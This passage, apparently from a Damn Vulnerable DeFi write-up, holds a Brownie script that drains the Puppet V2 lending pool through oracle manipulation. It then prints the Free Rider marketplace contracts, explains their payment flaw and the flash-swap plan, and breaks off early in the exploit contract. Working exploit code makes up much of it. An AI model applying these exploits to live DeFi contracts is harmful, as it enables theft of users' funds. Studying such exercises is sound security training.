in liquidity</span></span><br><span class="line">UNISWAP_INITIAL_TOKEN_RESERVE = Web3.toWei(<span class="number">100</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">UNISWAP_INITIAL_WETH_RESERVE = Web3.toWei(<span class="number">10</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ATTACKER_INITIAL_TOKEN_BALANCE = Web3.toWei(<span class="number">10000</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">ATTACKER_INITIAL_ETH_BALANCE = Web3.toWei(<span class="number">20</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">POOL_INITIAL_TOKEN_BALANCE = Web3.toWei(<span class="string">&#x27;1000000&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">RANDOM_ADDRESS = <span class="string">&#x27;0x5832727e34162736F3e7082EDad9DCfD76e15D0a&#x27;</span></span><br><span class="line">RANDOM_ADDRESS_PK = <span class="string">&#x27;57f7f022e5941d0573114e2aab6e08aeb9a6f28b42d48e63a374783d7f1fdadb&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_json</span>(<span class="params">json_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./scripts/build-uniswap-v2/<span class="subst">&#123;json_file&#125;</span>&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        contract_metadata = json.loads(f.read())</span><br><span class="line">        contract_abi = contract_metadata[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">        contract_bytecode = contract_metadata[<span class="string">&#x27;bytecode&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> contract_abi, contract_bytecode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy_bytecode</span>(<span class="params">contract_abi, contract_bytecode, *args</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This will connect to Brownie&#x27;s ganache instance</span></span><br><span class="line">    w3_client = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://0.0.0.0:8545&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    temp_contract = w3_client.eth.contract(</span><br><span class="line">        abi=contract_abi, bytecode=contract_bytecode)</span><br><span class="line">    n = w3_client.eth.get_transaction_count(RANDOM_ADDRESS)</span><br><span class="line"></span><br><span class="line">    tx = temp_contract.constructor(*args).buildTransaction(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: RANDOM_ADDRESS, <span class="string">&#x27;nonce&#x27;</span>: n, <span class="string">&#x27;gasPrice&#x27;</span>: w3_client.eth.gas_price&#125;</span><br><span class="line">    )</span><br><span class="line">    signed_tx = w3_client.eth.account.sign_transaction(</span><br><span class="line">        tx, private_key=RANDOM_ADDRESS_PK)</span><br><span class="line"></span><br><span class="line">    accounts[<span class="number">0</span>].transfer(RANDOM_ADDRESS, <span class="string">&#x27;1 ether&#x27;</span>)</span><br><span class="line">    txh = w3_client.eth.send_raw_transaction(signed_tx.rawTransaction)</span><br><span class="line">    tx_receipt = w3_client.eth.wait_for_transaction_receipt(txh)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tx_receipt.contractAddress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scenario_setup</span>():</span><br><span class="line">    <span class="comment"># deploy script is from https://github.com/nahueldsanchez/dvd_brownie</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set attacker account</span></span><br><span class="line">    ATTACKER_ACCOUNT = accounts.add()</span><br><span class="line">    accounts[<span class="number">1</span>].transfer(ATTACKER_ACCOUNT, <span class="string">&#x27;20 ether&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> ATTACKER_ACCOUNT.balance() == ATTACKER_INITIAL_ETH_BALANCE</span><br><span class="line">    <span class="comment"># ####################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deploy DVT and WETH9</span></span><br><span class="line">    damn_valuable_token = DamnValuableToken.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    weth9 = WETH9.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="comment"># ####################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deploy UNISWAP V2 Factory</span></span><br><span class="line">    uniswap_v2_factory_abi, uniswap_v2_factory_bytecode = load_json(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Factory.json&#x27;</span>)</span><br><span class="line">    uniswap_v2_factory_address = deploy_bytecode(</span><br><span class="line">        uniswap_v2_factory_abi, uniswap_v2_factory_bytecode, <span class="string">&#x27;0x0000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    uniswap_v2_factory = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Factory&#x27;</span>, uniswap_v2_factory_address, uniswap_v2_factory_abi</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">###########################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deploy UNISWAP V2 Router</span></span><br><span class="line">    uniswap_v2_router_abi, uniswap_v2_router_bytecode = load_json(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Router02.json&#x27;</span>)</span><br><span class="line">    uniswap_v2_router_address = deploy_bytecode(</span><br><span class="line">        uniswap_v2_router_abi, uniswap_v2_router_bytecode, uniswap_v2_factory.address, weth9.address)</span><br><span class="line">    uniswap_v2_router = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Router&#x27;</span>, uniswap_v2_router_address, uniswap_v2_router_abi)</span><br><span class="line">    <span class="comment">#############################</span></span><br><span class="line"></span><br><span class="line">    accounts[<span class="number">9</span>].transfer(RANDOM_ADDRESS, UNISWAP_INITIAL_WETH_RESERVE)</span><br><span class="line">    damn_valuable_token.approve(</span><br><span class="line">        uniswap_v2_router, UNISWAP_INITIAL_TOKEN_RESERVE, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    deadline = chain[-<span class="number">1</span>].timestamp * <span class="number">2</span></span><br><span class="line">    tx = uniswap_v2_router.addLiquidityETH(damn_valuable_token.address, UNISWAP_INITIAL_TOKEN_RESERVE, <span class="number">0</span>, <span class="number">0</span>, RANDOM_ADDRESS, deadline, &#123;</span><br><span class="line">                                           <span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>], <span class="string">&#x27;value&#x27;</span>: UNISWAP_INITIAL_WETH_RESERVE&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deploy UNISWAP v2 Pair</span></span><br><span class="line">    uniswap_v2_pair_abi, uniswap_v2_pair_bytecode = load_json(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Pair.json&#x27;</span>)</span><br><span class="line">    uniswap_v2_pair = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Pair&#x27;</span>, uniswap_v2_factory.getPair(</span><br><span class="line">            damn_valuable_token, weth9), uniswap_v2_pair_abi</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">########################</span></span><br><span class="line"></span><br><span class="line">    puppet_v2_pool = PuppetV2Pool.deploy(</span><br><span class="line">        weth9, damn_valuable_token, uniswap_v2_pair, uniswap_v2_factory, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    damn_valuable_token.transfer(</span><br><span class="line">        ATTACKER_ACCOUNT, ATTACKER_INITIAL_TOKEN_BALANCE, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    damn_valuable_token.transfer(</span><br><span class="line">        puppet_v2_pool, POOL_INITIAL_TOKEN_BALANCE, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> puppet_v2_pool.calculateDepositOfWETHRequired(</span><br><span class="line">        <span class="string">&#x27;1 ether&#x27;</span>) == <span class="string">&#x27;0.3 ether&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> puppet_v2_pool.calculateDepositOfWETHRequired(</span><br><span class="line">        POOL_INITIAL_TOKEN_BALANCE) == <span class="string">&#x27;300000 ether&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uniswap_v2_router, damn_valuable_token, weth9, puppet_v2_pool, ATTACKER_ACCOUNT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">token, lending_pool, uniswap_router, weth9, attacker</span>):</span><br><span class="line">    token.approve(</span><br><span class="line">        uniswap_router, token.balanceOf(attacker), &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    uniswap_router.swapExactTokensForETH(token.balanceOf(attacker), <span class="number">1</span>, [</span><br><span class="line">                                         token, weth9], attacker, chain[-<span class="number">1</span>].timestamp * <span class="number">2</span>, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    weth9.deposit(&#123;<span class="string">&#x27;from&#x27;</span>: attacker,</span><br><span class="line">                   <span class="string">&#x27;value&#x27;</span>: attacker.balance()&#125;)</span><br><span class="line">    token.approve(uniswap_router, ATTACKER_INITIAL_TOKEN_BALANCE, &#123;</span><br><span class="line">                  <span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    weth9.approve(lending_pool, lending_pool.calculateDepositOfWETHRequired(</span><br><span class="line">        token.balanceOf(lending_pool)), &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    lending_pool.borrow(token.balanceOf(</span><br><span class="line">        lending_pool), &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">token, lending_pool, attacker</span>):</span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(lending_pool) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(attacker) == POOL_INITIAL_TOKEN_BALANCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    uniswap_v2_router, damn_valuable_token, weth9, puppet_v2_pool, ATTACKER_ACCOUNT = scenario_setup()</span><br><span class="line">    exploit(damn_valuable_token, puppet_v2_pool,</span><br><span class="line">            uniswap_v2_router, weth9, ATTACKER_ACCOUNT)</span><br><span class="line">    after(damn_valuable_token, puppet_v2_pool, ATTACKER_ACCOUNT)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Free-rider"><a href="#Free-rider" class="headerlink" title="Free rider"></a>Free rider</h2><p>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p>
<p>A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn’t know how to do it. So it’s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.</p>
<p>You want to build some rep with this buyer, so you’ve agreed with the plan.</p>
<p>Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.</p>
<h3 id="FreeRiderBuyer-sol"><a href="#FreeRiderBuyer-sol" class="headerlink" title="FreeRiderBuyer.sol"></a>FreeRiderBuyer.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/IERC721.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">FreeRiderBuyer</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">FreeRiderBuyer</span> is <span class="title class_">ReentrancyGuard</span>, <span class="title class_">IERC721Receiver</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line">    address private immutable partner;</span><br><span class="line">    <span class="title class_">IERC721</span> private immutable nft;</span><br><span class="line">    uint256 private constant <span class="variable constant_">JOB_PAYOUT</span> = <span class="number">45</span> ether;</span><br><span class="line">    uint256 private received;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _partner, address _nft</span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="variable constant_">JOB_PAYOUT</span>);</span><br><span class="line">        partner = _partner;</span><br><span class="line">        nft = <span class="title class_">IERC721</span>(_nft);</span><br><span class="line">        <span class="title class_">IERC721</span>(_nft).<span class="title function_">setApprovalForAll</span>(msg.<span class="property">sender</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onERC721Received</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address,</span></span><br><span class="line"><span class="params">        address,</span></span><br><span class="line"><span class="params">        uint256 _tokenId,</span></span><br><span class="line"><span class="params">        bytes memory</span></span><br><span class="line"><span class="params">    </span>) </span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">        nonReentrant</span><br><span class="line">        returns (bytes4) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(nft));</span><br><span class="line">        <span class="built_in">require</span>(tx.<span class="property">origin</span> == partner);</span><br><span class="line">        <span class="built_in">require</span>(_tokenId &gt;= <span class="number">0</span> &amp;&amp; _tokenId &lt;= <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">require</span>(nft.<span class="title function_">ownerOf</span>(_tokenId) == <span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        </span><br><span class="line">        received++;</span><br><span class="line">        <span class="keyword">if</span>(received == <span class="number">6</span>) &#123;            </span><br><span class="line">            <span class="title function_">payable</span>(partner).<span class="title function_">sendValue</span>(<span class="variable constant_">JOB_PAYOUT</span>);</span><br><span class="line">        &#125;            </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">IERC721Receiver</span>.<span class="property">onERC721Received</span>.<span class="property">selector</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FreeRiderNFTMarketplace-sol"><a href="#FreeRiderNFTMarketplace-sol" class="headerlink" title="FreeRiderNFTMarketplace.sol"></a>FreeRiderNFTMarketplace.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableNFT.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">FreeRiderNFTMarketplace</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">FreeRiderNFTMarketplace</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">DamnValuableNFT</span> public token;</span><br><span class="line">    uint256 public amountOfOffers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tokenId -&gt; price</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint256</span> =&gt;</span> uint256) private offers;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">NFTOffered</span>(address indexed offerer, uint256 tokenId, uint256 price);</span><br><span class="line">    event <span class="title class_">NFTBought</span>(address indexed buyer, uint256 tokenId, uint256 price);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">uint8 amountToMint</span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(amountToMint &lt; <span class="number">256</span>, <span class="string">&quot;Cannot mint that many tokens&quot;</span>);</span><br><span class="line">        token = <span class="keyword">new</span> <span class="title class_">DamnValuableNFT</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint8 i = <span class="number">0</span>; i &lt; amountToMint; i++) &#123;</span><br><span class="line">            token.<span class="title function_">safeMint</span>(msg.<span class="property">sender</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">offerMany</span>(<span class="params">uint256[] calldata tokenIds, uint256[] calldata prices</span>)</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">require</span>(tokenIds.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; tokenIds.<span class="property">length</span> == prices.<span class="property">length</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; tokenIds.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">_offerOne</span>(tokenIds[i], prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_offerOne</span>(<span class="params">uint256 tokenId, uint256 price</span>) private &#123;</span><br><span class="line">        <span class="built_in">require</span>(price &gt; <span class="number">0</span>, <span class="string">&quot;Price must be greater than zero&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.<span class="property">sender</span> == token.<span class="title function_">ownerOf</span>(tokenId),</span><br><span class="line">            <span class="string">&quot;Account offering must be the owner&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            token.<span class="title function_">getApproved</span>(tokenId) == <span class="title function_">address</span>(<span class="variable language_">this</span>) ||</span><br><span class="line">                token.<span class="title function_">isApprovedForAll</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="string">&quot;Account offering must have approved transfer&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        offers[tokenId] = price;</span><br><span class="line"></span><br><span class="line">        amountOfOffers++;</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">NFTOffered</span>(msg.<span class="property">sender</span>, tokenId, price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buyMany</span>(<span class="params">uint256[] calldata tokenIds</span>)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; tokenIds.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">_buyOne</span>(tokenIds[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_buyOne</span>(<span class="params">uint256 tokenId</span>) private &#123;</span><br><span class="line">        uint256 priceToPay = offers[tokenId];</span><br><span class="line">        <span class="built_in">require</span>(priceToPay &gt; <span class="number">0</span>, <span class="string">&quot;Token is not being offered&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= priceToPay, <span class="string">&quot;Amount paid is not enough&quot;</span>);</span><br><span class="line"></span><br><span class="line">        amountOfOffers--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transfer from seller to buyer</span></span><br><span class="line">        token.<span class="title function_">safeTransferFrom</span>(token.<span class="title function_">ownerOf</span>(tokenId), msg.<span class="property">sender</span>, tokenId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// pay seller</span></span><br><span class="line">        <span class="title function_">payable</span>(token.<span class="title function_">ownerOf</span>(tokenId)).<span class="title function_">sendValue</span>(priceToPay);</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">NFTBought</span>(msg.<span class="property">sender</span>, tokenId, priceToPay);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Our goal is to buy six NFTs with the actual price of <code>15 ether</code> for less cheap. Here the <code>FreeRiderNFTMarketplace</code> contract has a <code>buymany()</code> function which checks if the msg. Value is &gt; 15 ether for each NTFs hence we can buy as many NTFs as we like with just the price of one nft that is 15 ether and addition to that, the contract tries to send the ether to the seller, but fortunately, it is transferring the contract to us then retrieving the owner of the nft to get the seller address, since the contract is transferring the nft first the owner is the attacker, so it sends the <code>15 ether</code> back to the attacker. However, unlike the attacker, the contract sends <code>15 ether</code> <strong>6 times</strong>. Nevertheless, to happen all this, the attacker needs <code>15 ether</code> to get that. He needs to take a <strong>flashSwap</strong> from the uniswap contract.</p>
<h3 id="freerider-exploit-sol"><a href="#freerider-exploit-sol" class="headerlink" title="freerider_exploit.sol"></a>freerider_exploit.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/IERC721.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">WETH9</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 wad</span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address dst, uint256 wad</span>) external returns (bool);</span><br><span 